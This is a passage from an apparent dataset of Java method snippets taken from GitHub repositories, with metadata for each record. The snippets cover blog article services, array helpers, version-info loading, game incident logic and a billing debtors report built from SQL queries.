"https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 58624, "method_name": "updateContentByCid", "class_name": "ContentServiceImpl", "params": ["ContentDomain"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateContentByCid(ContentDomain content) {\n        if (null != content && null != content.getCid()) {\n            contentDao.updateArticleById(content);\n        }\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 58625, "method_name": "getAtricleById", "class_name": "ContentServiceImpl", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "ContentDomain", "snippet": "    public ContentDomain getAtricleById(Integer cid) {\n        if (null == cid)\n            throw BusinessException.withErrorCode(ErrorConstant.Common.PARAM_IS_EMPTY);\n        return contentDao.getArticleById(cid);\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 58626, "method_name": "getArticlesByCond", "class_name": "ContentServiceImpl", "params": ["ContentCond", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "PageInfo<ContentDomain>", "snippet": "    public PageInfo<ContentDomain> getArticlesByCond(ContentCond contentCond, int pageNum, int pageSize) {\n        if (null == contentCond)\n            throw BusinessException.withErrorCode(ErrorConstant.Common.PARAM_IS_EMPTY);\n        PageHelper.startPage(pageNum, pageSize);\n        List<ContentDomain> contents = contentDao.getArticlesByCond(contentCond);\n        PageInfo<ContentDomain> pageInfo = new PageInfo<>(contents);\n        return pageInfo;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 58627, "method_name": "getRecentlyArticle", "class_name": "ContentServiceImpl", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "PageInfo<ContentDomain>", "snippet": "    public PageInfo<ContentDomain> getRecentlyArticle(int pageNum, int pageSize) {\n        PageHelper.startPage(pageNum, pageSize);\n        List<ContentDomain> recentlyArticle = contentDao.getRecentlyArticle();\n        PageInfo<ContentDomain> pageInfo = new PageInfo<>(recentlyArticle);\n        return pageInfo;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 58628, "method_name": "searchArticle", "class_name": "ContentServiceImpl", "params": ["String", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "PageInfo<ContentDomain>", "snippet": "    public PageInfo<ContentDomain> searchArticle(String param, int pageNun, int pageSize) {\n        PageHelper.startPage(pageNun,pageSize);\n        List<ContentDomain> contentDomains = contentDao.searchArticle(param);\n        PageInfo<ContentDomain> pageInfo = new PageInfo<>(contentDomains);\n        return pageInfo;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 58629, "method_name": "main", "class_name": "FixedSize1", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tString[] car = new String[4];\n\t\tcar[0] = \"BMW\";\n\t\tcar[1] = \"Audi\";\n\t\tcar[2] = \"Mercedes\";\n\t\tcar[3] = \"Toyota\";\n\t\t\n\t\tSystem.out.println(Arrays.toString(car));\n\t\tcar = addElement(car, \"Honda\");\n\t\tSystem.out.println(Arrays.toString(car));\n\t\tcar = addElement(car, \"Jeep\");\n\t\tSystem.out.println(Arrays.toString(car));\n\t\t//   0     1     2         3       4      5\n\t\t// [BMW, Audi, Mercedes, Toyota, Honda, Jeep]\n\t\t// [BMW, Audi, Mercedes, Honda, Jeep]\n\t\tcar = removeByIndex(car, 3);\n\t\tSystem.out.println(Arrays.toString(car));\n\t\t\n\t\tcar = removeByIndex(car, 0);\n\t\tSystem.out.println(Arrays.toString(car));\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day20/FixedSize1.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58630, "method_name": "removeByIndex", "class_name": "FixedSize1", "params": ["String", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String[] removeByIndex(String[] arr, int index) {\n\t\tString[] arrCopy = new String[arr.length-1];\n\t\tint aIndex = 0;\n\t\tfor(int i = 0; i < arr.length; i++) {\n\t\t\tif(i == index) {\n\t\t\t\t// continue keyword will skip iteration\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t\n\t\t\tarrCopy[aIndex] = arr[i];\n\t\t\taIndex++;\n\t\t}\n\t\t\n\t\treturn arrCopy;\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day20/FixedSize1.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58631, "method_name": "addElement", "class_name": "FixedSize1", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String[] addElement(String[] arr, String value) {\n\t\t\n\t\tString[] arrCopy = new String[arr.length + 1];\n\t\t\n\t\tfor(int i = 0; i < arr.length; i++) {\n\t\t\tarrCopy[i] = arr[i];\n\t\t}\n\t\t\n\t\tarrCopy[arrCopy.length - 1] = value;\n\t\t\n\t\treturn arrCopy;\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day20/FixedSize1.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58632, "method_name": "setProperties", "class_name": "VersionInfo", "params": ["Properties"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProperties( Properties properties )\n    {\n        this.properties = properties;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/distr/VersionInfo.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58633, "method_name": "getProperty", "class_name": "VersionInfo", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getProperty( String name )\n    {\n        String result = \"\";\n        \n        if( properties != null )\n        {\n            result = properties.getProperty( name );\n        }\n        \n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/distr/VersionInfo.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58634, "method_name": "getModuleName", "class_name": "VersionInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getModuleName()\n    {\n        return getProperty( \"name\" );\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/distr/VersionInfo.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58635, "method_name": "getVersion", "class_name": "VersionInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getVersion()\n    {\n        return getProperty( \"version\" );\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/distr/VersionInfo.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58636, "method_name": "getBuildNumber", "class_name": "VersionInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getBuildNumber()\n    {\n        return getProperty( \"build.number\" );\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/distr/VersionInfo.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58637, "method_name": "getBuildTime", "class_name": "VersionInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getBuildTime()\n    {\n        return getProperty( \"build.time\" );\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/distr/VersionInfo.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58638, "method_name": "getVersionInfo", "class_name": "VersionInfo", "params": ["String"], "throws": null, "modifiers": ["final", "public", "static"], "return_type": "VersionInfo", "snippet": "    public static final VersionInfo getVersionInfo( String module )\n    {\n\t\tVersionInfo result = new VersionInfo();\n\t\t\n\t    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n\t\tif( classLoader != null )\n\t\t{\n\t\t\tInputStream is = classLoader.getResourceAsStream( Const.VERSION_INFO_PACKAGE + module + \".properties\" );\n\t\t\tif( is != null )\n\t\t\t{\n\t\t\t\ttry\n\t\t\t\t{\n\t\t\t\t\tProperties p = new Properties();\n\t\t\t\t\tp.load( is );\n\t\t\t\t\tresult.setProperties( p );\n\t\t\t\t\tis.close();\n\t\t\t\t}\n\t\t\t\tcatch( IOException e )\n\t\t\t\t{\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/distr/VersionInfo.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58639, "method_name": "getInstalledVersions", "class_name": "VersionInfo", "params": [], "throws": null, "modifiers": ["final", "public", "static"], "return_type": "List<VersionInfo>", "snippet": "\tpublic static final List<VersionInfo> getInstalledVersions()\n    {\n    \tList<VersionInfo> result = new ArrayList<VersionInfo>();\n    \t\n\t\ttry\n\t\t{\n\t\t\tFile libExtDir = new File( Const.LIB_APP_DIR );\n\t\t\tfor( File file : libExtDir.listFiles() )\n\t\t\t{\n\t\t\t\tif( !file.getName().endsWith( \".jar\" ) )\n\t\t\t\t{\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tZipInputStream zis = new ZipInputStream( new FileInputStream( file ) );\n\t\t\t\t\n\t\t        ZipEntry entry = null;\n\t\t        while( (entry = zis.getNextEntry()) != null )\n\t\t        {\n\t\t            String entryName = entry.getName();\n\t\t            \n\t\t            if( entryName.startsWith( Const.VERSION_INFO_PACKAGE ) &&\n\t\t                entryName.endsWith( \".properties\" ) )\n\t\t            {\n\t\t                Properties props = new Properties();\n\t\t                props.load( zis );\n\t\t                \n\t\t                VersionInfo vi = new VersionInfo();\n\t\t                vi.setProperties( props );\n\t\t                \n\t\t                result.add( vi );\n\t\t            }\n\t\t        }\n\t\t        \n\t\t        zis.close();\n\t\t    }\n\t\t}\n\t\tcatch( Exception e )\n\t\t{\n\t\t\te.printStackTrace();\n\t\t}\n\t\t\n\t\treturn result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/distr/VersionInfo.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58640, "method_name": "convertToPrimitiveArray", "class_name": "ByteArrayUtils", "params": ["Byte"], "throws": null, "modifiers": ["static"], "return_type": "byte", "snippet": "  static byte[] convertToPrimitiveArray(Byte[] objects) {\n    final byte[] bytes = new byte[objects.length];\n    for (int i = 0; i < objects.length; i++) {\n      bytes[i] = objects[i];\n    }\n    return bytes;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ByteArrayUtils.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58641, "method_name": "convertToObjectArray", "class_name": "ByteArrayUtils", "params": ["byte"], "throws": null, "modifiers": ["static"], "return_type": "Byte", "snippet": "  static Byte[] convertToObjectArray(byte[] bytes) {\n    final Byte[] objects = new Byte[bytes.length];\n    for (int i = 0; i < bytes.length; i++) {\n      objects[i] = bytes[i];\n    }\n    return objects;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ByteArrayUtils.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58642, "method_name": "create", "class_name": "ColonyDestroyedIncident", "params": ["ShipCombatResults"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void create(ShipCombatResults r) {\n        if (r.defender().extinct())\n            return;\n\n        ColonyDestroyedIncident inc = new ColonyDestroyedIncident(r);\n        r.defender().diplomatAI().noticeIncident(inc, r.attacker());\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ColonyDestroyedIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 58643, "method_name": "systemName", "class_name": "ColonyDestroyedIncident", "params": [], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String systemName() { return player().sv.name(sysId); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ColonyDestroyedIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 58644, "method_name": "title", "class_name": "ColonyDestroyedIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String title()         { return text(\"INC_DESTROYED_COLONY_TITLE\", systemName(), str(popLost)); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ColonyDestroyedIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 58645, "method_name": "description", "class_name": "ColonyDestroyedIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String description()   { return  decode(text(\"INC_DESTROYED_COLONY_DESC\")); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ColonyDestroyedIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 58646, "method_name": "declareWarId", "class_name": "ColonyDestroyedIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String declareWarId()  { return DialogueManager.DECLARE_ATTACKED_WAR; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ColonyDestroyedIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 58647, "method_name": "key", "class_name": "ColonyDestroyedIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String key() {\n        return concat(systemName(), \":\", str(dateOccurred));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ColonyDestroyedIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 58648, "method_name": "decode", "class_name": "ColonyDestroyedIncident", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String decode(String s) {\n        String s1 = super.decode(s);\n        s1 = s1.replace(\"[system]\", systemName());\n        s1 = s1.replace(\"[amt]\", str(popLost));\n        s1 = galaxy().empire(empAttacker).replaceTokens(s1, \"attacker\");\n        s1 = galaxy().empire(empDefender).replaceTokens(s1, \"defender\");\n        return s1;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ColonyDestroyedIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 58649, "method_name": "getBillingId", "class_name": "ReportCustomDebtors", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getBillingId()\n    {\n        return billingId;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/doc/plugin/report/_res/ReportCustomDebtors.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58650, "method_name": "getConnection", "class_name": "ReportCustomDebtors", "params": [], "throws": ["BGException"], "modifiers": ["private"], "return_type": "Connection", "snippet": "    private Connection getConnection() throws BGException\n    {\n        DBInfo dbInfo = DBInfoManager.getInstance().getDbInfoMap().get( billingId );\n        if ( dbInfo == null )\n        {\n            throw new BGException( \"\u041d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u0431\u0438\u043b\u043b\u0438\u043d\u0433: \" + billingId );\n        }\n        \n        Connection con = dbInfo.getConnectionPool().getConnectionSet().getConnection();\n        if( con == null )\n        {\n            throw new BGException( \"Connection is NULL ! Billing - \" + billingId );\n        }\n        return con;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/doc/plugin/report/_res/ReportCustomDebtors.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58651, "method_name": "getStreetList", "class_name": "ReportCustomDebtors", "params": [], "throws": ["SQLException", "BGException"], "modifiers": ["public"], "return_type": "List<IdTitle>", "snippet": "    public List<IdTitle> getStreetList() throws SQLException, BGException\n    {\n        if( streetList == null )\n        {\n//            System.out.println( \"Intit Streets!\"  );\n            streetList = new ArrayList<>();\n            try( Connection con = getConnection() ) \n            {\n                try( PreparedStatement ps = con.prepareStatement( \"SELECT id,title FROM address_street WHERE cityid=\" + cityId + \" ORDER BY title\" ) ) \n                {\n                    ResultSet rs = ps.executeQuery();\n                    while( rs.next() )\n                    {\n                        streetList.add( new IdTitle( rs.getInt( 1 ), rs.getString( 2 ) ) );\n                    }\n                }\n            }\n        }\n        return streetList;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/doc/plugin/report/_res/ReportCustomDebtors.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58652, "method_name": "getGroups", "class_name": "ReportCustomDebtors", "params": [], "throws": ["SQLException", "BGException"], "modifiers": ["public"], "return_type": "List<IdTitle>", "snippet": "    public List<IdTitle> getGroups() throws SQLException, BGException\n    {\n        if( groups == null )\n        {\n            groups = new ArrayList<>();\n            try( Connection con = getConnection() ) \n            {\n                try( PreparedStatement ps = con.prepareStatement( \"SELECT id,title FROM contract_group WHERE enable=1\" ) ) \n                {\n                    ResultSet rs = ps.executeQuery();\n                    while( rs.next() )\n                    {\n                        groups.add( new IdTitle( rs.getInt( 1 ), rs.getString( 2 ) ) );\n                    }\n                }\n            }\n        }\n        return groups;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/doc/plugin/report/_res/ReportCustomDebtors.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58653, "method_name": "getStatus", "class_name": "ReportCustomDebtors", "params": [], "throws": ["SQLException", "BGException"], "modifiers": ["public"], "return_type": "List<IdTitle>", "snippet": "    public List<IdTitle> getStatus() throws SQLException, BGException\n    {\n        if( statuses == null )\n        {\n            statuses = new ArrayList<>();\n            statuses.add( new IdTitle(0,\"\u0410\u043a\u0442\u0438\u0432\u0435\u043d\") );\n            statuses.add( new IdTitle(1,\"\u0412 \u043e\u0442\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0438\") );\n            statuses.add( new IdTitle(2,\"\u041e\u0442\u043a\u043b\u044e\u0447\u0435\u043d_\u0437\u0430_\u0434\u043e\u043b\u0433\u0438\") );\n            statuses.add( new IdTitle(3,\"\u0417\u0430\u043a\u0440\u044b\u0442\") );\n            statuses.add( new IdTitle(4,\"\u041f\u0440\u0438\u043e\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\") );\n            statuses.add( new IdTitle(5,\"\u0412 \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0438\") );\n        }\n        return statuses;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/doc/plugin/report/_res/ReportCustomDebtors.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58654, "method_name": "getSortList", "class_name": "ReportCustomDebtors", "params": [], "throws": ["SQLException", "BGException"], "modifiers": ["public"], "return_type": "List<IdTitle>", "snippet": "    public List<IdTitle> getSortList() throws SQLException, BGException\n    {\n        if( sorts == null )\n        {\n            sorts = new ArrayList<>();\n            sorts.add( new IdTitle( 1, \"\u0423\u043b\u0438\u0446\u0430\" ) );\n            sorts.add( new IdTitle( 2, \"\u0414\u043e\u043c\" ) );\n            sorts.add( new IdTitle( 3, \"\u041a\u0432\u0430\u0440\u0442\u0438\u0440\u0430\" ) );\n            sorts.add( new IdTitle( 4, \"\u0411\u0430\u043b\u0430\u043d\u0441\" ) );\n        }\n        return sorts;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/doc/plugin/report/_res/ReportCustomDebtors.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58655, "method_name": "getSortMap", "class_name": "ReportCustomDebtors", "params": [], "throws": ["SQLException", "BGException"], "modifiers": ["public"], "return_type": "Map<Integer,IdTitle>", "snippet": "    public Map<Integer, IdTitle> getSortMap() throws SQLException, BGException\n    {\n        if( sortMap == null )\n        {\n            sortMap = new HashMap<Integer, IdTitle>();\n            for( IdTitle item : getSortList() )\n            {\n                sortMap.put( item.getId(), item );\n            }\n        }\n        return sortMap;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/doc/plugin/report/_res/ReportCustomDebtors.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58656, "method_name": "getDebters", "class_name": "ReportCustomDebtors", "params": ["Set<Integer>", "Set<Integer>", "int", "String", "String", "String", "List<Integer>"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String[]> getDebters( Set<Integer> groups, Set<Integer> statuses, int streetId, String homeNumber, String balanceFromStr, String balanceToStr, List<Integer> sort ) throws BGException \n    {\n        List<String[]> result = new ArrayList<String[]>();\n        try( Connection con = getConnection() ) \n        {\n            if( streetMap == null )\n            {\n                streetMap = new HashMap<>();\n                for( IdTitle idTitle : getStreetList() )\n                {\n                    streetMap.put( idTitle.getId(), idTitle.getTitle() );\n                }\n            }\n\n            dropTables( con );\n            \n            long gr = getGroupMask( groups );\n            String status = Utils.toString( statuses );\n            int balanceFrom = Utils.parseInt( balanceFromStr, Integer.MIN_VALUE );\n            int balanceTo = Utils.parseInt( balanceToStr, Integer.MAX_VALUE );\n            String balance = \" IF( temp_balance.mm IS NULL, 0, ( b.summa1 + b.summa2 - b.summa3 - b.summa4) ) \";\n//            \n            // \u041f\u0440\u0435\u0434\u043d\u0430\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 \u0442\u0430\u0431\u043b\u0438\u0446\u044b \u0434\u0430\u0431\u044b \u0434\u0432\u0430\u0436\u0434\u044b \u043d\u0435 \u0434\u0435\u043b\u0430\u0442\u044c \u0432\u044b\u0431\u043e\u0440\u043a\u0443 \u043f\u043e \u0433\u0440\u0443\u043f\u043f\u0435. \u0410 \u0442\u0430\u043a \u0436\u0435 \u0440\u0430\u0437 \u0432\u044b\u0431\u043e\u0440\u043a\u0430 \u0443\u0436\u0435 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u0438\u0442\u0441\u044f, \u0442\u043e \u043f\u0438\u0445\u0430\u044e \u0442\u0443\u0434\u0430 \u0435\u0449\u0435 \u0438 \u0430\u0434\u0440\u0435\u0441\n            String query = \"CREATE TEMPORARY TABLE \" + tableGroupName + \" (UNIQUE(contractId)) SELECT c.id AS contractId, ah.streetid AS streetId, concat(ah.house,ah.frac) AS homeN, cpa.flat AS flat FROM contract AS c \";\n            query += \" LEFT JOIN contract_parameter_type_2 AS cpa ON cpa.cid=c.id AND cpa.pid=\" + adressParamId\n            + ( streetId > 0 || Utils.notBlankString( homeNumber ) ? \" INNER\" : \" LEFT\" ); // INNER \u0435\u0441\u043b\u0438 \u043e\u0431\u044f\u0437\u0430\u0442\u0435\u043b\u0435\u043d\n            query += \" JOIN address_house AS ah ON ah.id=cpa.hid\"; \n            if( streetId > 0 )\n            {\n                query += \" AND ah.streetid=\" + streetId;\n            }\n            query += \" WHERE 1=1\";\n            if( gr > 0 )// \u0435\u0441\u043b\u0438 \u0433\u0440\u0443\u043f\u043f\u044b \u043d\u0435\u0442, \u0442\u043e \u0432\u0441\u0435.\n            {\n                query += \" AND c.gr&\" + gr + \">0 \";\n            }\n            if ( Utils.notBlankString( status ) )\n            {\n                query += \" AND c.status IN ( \" + status + \" )\";\n            }\n            if( Utils.notBlankString( homeNumber ) )\n            {\n                query += \" AND concat(ah.house,ah.frac) LIKE ?\";\n            }\n            PreparedStatement psg = con.prepareStatement( query );\n            if( Utils.notBlankString( homeNumber ) )\n                psg.setString( 1, homeNumber );\n            psg.executeUpdate();\n            \n            // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0432\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 \u0442\u0430\u0431\u043b\u0438\u0446\u044b \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0449\u0435\u0439 \u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u044b\u0439 \u043c\u0435\u0441\u044f\u0446 \u0433\u0434\u0435 \u0431\u044b\u043b \u0431\u0430\u043b\u0430\u043d\u0441. \u0414\u043b\u044f \u0440\u0430\u0441\u0447\u0435\u0442\u0430 \u0431\u0430\u043b\u0430\u043d\u0441\u0430 \u0434\u043e\u0433\u043e\u0432\u043e\u0440\u0430 \u0432 \u043e\u0441\u043d\u043e\u0432\u043d\u043e\u0439 \u0432\u044b\u0431\u043e\u0440\u043a\u0435.\n            String queryCreate = \"CREATE TEMPORARY TABLE \" + tableBalance + \" ( UNIQUE(cid) ) SELECT cid, MAX(yy*12+(mm-1))%12 + 1 AS mm, FLOOR(MAX(yy*12+(mm-1)) / 12) AS yy FROM contract_balance\";\n            queryCreate += \" RIGHT JOIN \" + tableGroupName + \" AS tgn ON tgn.contractId=cid GROUP BY cid\";\n            con.createStatement().executeUpdate( queryCreate );\n            \n         // \u041e\u0441\u043d\u043e\u0432\u043d\u0430\u044f \u0432\u044b\u0431\u043e\u0440\u043a\u0430\n            query = \"SELECT c.id, tgn.flat, tgn.homeN, tgn.streetId, cpS.val AS name, \" + balance + \"as balance, c.title as title, c.status FROM contract c\";\n            query += \" LEFT JOIN contract_parameter_type_1 AS cpS ON cpS.cid=c.id AND cpS.pid=\" + nameParamId\n                     + \" LEFT JOIN temp_balance ON temp_balance.cid=c.id\"\n                     + \" LEFT JOIN contract_balance AS b ON b.cid=c.id AND b.mm = temp_balance.mm AND b.yy = temp_balance.yy\"\n                     + \" RIGHT JOIN \" + tableGroupName + \" AS tgn ON tgn.contractId=c.id WHERE 1=1\";\n\n            if( balanceFrom != Integer.MIN_VALUE && balanceTo != Integer.MAX_VALUE )\n            {\n                if( balanceTo < 0 && balanceFrom > balanceTo )// \u043c\u0435\u043d\u044f\u0435\u043c \u043c\u0435\u0441\u0442\u0430\u043c\u0438, \u0447\u0442\u043e\u0431\u044b \u0441\u043c\u044b\u0441\u043b \u043d\u0435 \u043b\u043e\u043c\u0430\u043b\u0441\u044f\n                    query += \" AND\" + balance + \"BETWEEN \" + balanceTo + \" AND \" + balanceFrom;\n                else\n                    query += \" AND\" + balance + \"BETWEEN \" + balanceFrom + \" AND \" + balanceTo;\n            }\n            else\n            {\n                if( balanceFrom != Integer.MIN_VALUE )\n                {\n                    query += \" AND\" + balance + \">= \" + balanceFrom;\n                }\n                if( balanceTo != Integer.MAX_VALUE )\n                {\n                    query += \" AND \" + balance + \"<=\" + balanceTo;\n                }\n            }\n\n            query += \" GROUP BY c.id\";\n            if( sort != null && sort.size() > 0 )\n            {\n                query += \" ORDER BY \" + getOrder( sort );\n            }\n            // \u043b\u0438\u043c\u0438\u0442 \u043d\u0430 \u0432\u0441\u044f\u043a\u0438\u0439 \u0441\u043b\u0443\u0447\u0430\u0439.\n            query += \" LIMIT 1000\";\n            \n            try ( PreparedStatement ps = con.prepareStatement( query ) )\n            {\n                ResultSet rs = ps.executeQuery();\n                int n = 0;\n                while( rs.next() )\n                {\n                    n++;\n\n                    String address = \"\";\n                    int strId = rs.getInt( \"streetId\" );\n                    if( strId > 0 )\n                    {                        \n                        String streetTitle = Utils.maskNull( streetMap.get( strId ) );\n                        address = streetTitle + \", \" + rs.getString( \"homeN\" ) + \", \" + rs.getString( \"flat\" );\n                    }\n\n                    String cid = rs.getString( 1 );\n                    String title = rs.getString( \"title\" );\n                    String name = Utils.maskNull( rs.getString( \"name\" ) );\n                    \n                    String balanceContract = rs.getBigDecimal( \"balance\" ).toPlainString();\n                    \n                    result.add( new String[] { n + \"\", cid, title, name, address, balanceContract } );\n                }\n            }\n        } \n        catch (Exception ex) {\n            log.error(ex.getMessage(), ex);\n        }\n\n        return result;      \n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/doc/plugin/report/_res/ReportCustomDebtors.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58657, "method_name": "getOrder", "class_name": "ReportCustomDebtors", "params": ["List<Integer>"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getOrder( List<Integer> sort )\n    {\n        String result = 